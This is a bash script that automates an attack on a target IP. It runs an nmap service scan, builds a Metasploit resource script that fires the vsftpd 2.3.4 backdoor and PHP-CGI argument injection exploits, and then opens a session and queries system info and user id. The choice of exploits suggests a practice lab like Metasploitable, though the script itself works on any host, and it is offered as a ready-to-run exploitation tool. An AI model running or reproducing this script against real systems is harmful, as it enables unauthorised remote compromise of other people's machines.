#!/bin/bash

TARGET="$1"
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target_ip>"
  exit 1
fi

# Create exploit directory if it doesn't exist
OUTPUT_DIR="reports/exploit"
mkdir -p "$OUTPUT_DIR"

LOGFILE="$OUTPUT_DIR/full_scan_report.txt"

echo "[+] Scanning $TARGET for open services..." | tee -a "$LOGFILE"
# Nmap scan, save in folder
NMAP_OUTPUT="$OUTPUT_DIR/recon_report.txt"
nmap -sV -Pn "$TARGET" -oN "$NMAP_OUTPUT" 2>&1 | tee -a "$LOGFILE"

echo "[+] Generating Metasploit resource script..." | tee -a "$LOGFILE"
MSF_RC="$OUTPUT_DIR/auto_exploit_script.rc"
MSF_SPOOL="$OUTPUT_DIR/msf_output_report.txt"

cat <<EOF > "$MSF_RC"
spool $MSF_SPOOL
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST $TARGET
set RPORT 21
exploit -j
use exploit/unix/webapp/php_cgi_arg_injection
set RHOST $TARGET
set RPORT 80
exploit -j
sessions -i 1
sysinfo
1
getuid
spool off
EOF

echo "[+] Running Metasploit..." | tee -a "$LOGFILE"
# Run Metasploit with all output saved in folder
msfconsole -q -r "$MSF_RC" 2>&1 | tee -a "$LOGFILE"

echo "[+] Scan and exploit process completed." | tee -a "$LOGFILE"
echo "[+] All outputs saved in folder: $OUTPUT_DIR" | tee -a "$LOGFILE"
